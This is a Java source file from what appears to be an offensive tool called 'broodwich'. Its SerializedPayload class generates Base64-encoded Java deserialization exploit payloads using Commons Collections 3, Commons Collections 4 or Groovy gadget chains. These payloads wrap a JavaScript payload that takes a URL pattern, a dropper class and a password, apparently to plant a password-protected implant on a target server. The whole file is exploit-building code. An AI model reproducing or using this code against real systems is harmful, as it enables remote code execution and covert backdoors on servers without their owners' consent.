package party.itistimeto.broodwich.payloads;

import party.itistimeto.broodwich.deserialization.CommonsCollectionsFourPayload;
import party.itistimeto.broodwich.deserialization.CommonsCollectionsThreePayload;
import party.itistimeto.broodwich.deserialization.GroovyPayload;

import java.io.IOException;
import java.net.URISyntaxException;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.Base64;
import java.util.Map;

// todo: incorrect semantics since no "is-a" relationship?
public class SerializedPayload extends JavascriptPayload {
    public static final String[] VALID_SER_TYPES = new String[]{"CC3", "CC4", "Groovy"};
    public static final String OPT_SER_TYPE = "serObjType";

    public SerializedPayload(String urlPattern, Class dropperClass, String password, Map<String, String> options) throws IOException, URISyntaxException, NoSuchAlgorithmException {
        super(urlPattern, dropperClass, password, options);
    }

    @Override
    public String toString() {
        return Base64.getEncoder().encodeToString(this.toBytes());
    }

    @Override
    public byte[] toBytes() {
        if(this.options != null && options.containsKey(OPT_SER_TYPE)) {
            String type = options.get(OPT_SER_TYPE);

            // TODO: lol this is so dumb; need to create some kind of PayloadException to more properly communicate errors to client jar
            if(!Arrays.asList(VALID_SER_TYPES).contains(type)) {
                return "specified serialization type not valid".getBytes(); // TODO: list valid types
            }

            switch (type) {
                case "CC3":
                    return (new CommonsCollectionsThreePayload()).generateJavaScriptPayload(super.toString());
                case "CC4":
                    return (new CommonsCollectionsFourPayload()).generateJavaScriptPayload(super.toString());
                case "Groovy":
                    return (new GroovyPayload()).generateJavaScriptPayload(super.toString());
            }
        }

        return "missing serialization type".getBytes(); // TODO: see above
    }
}
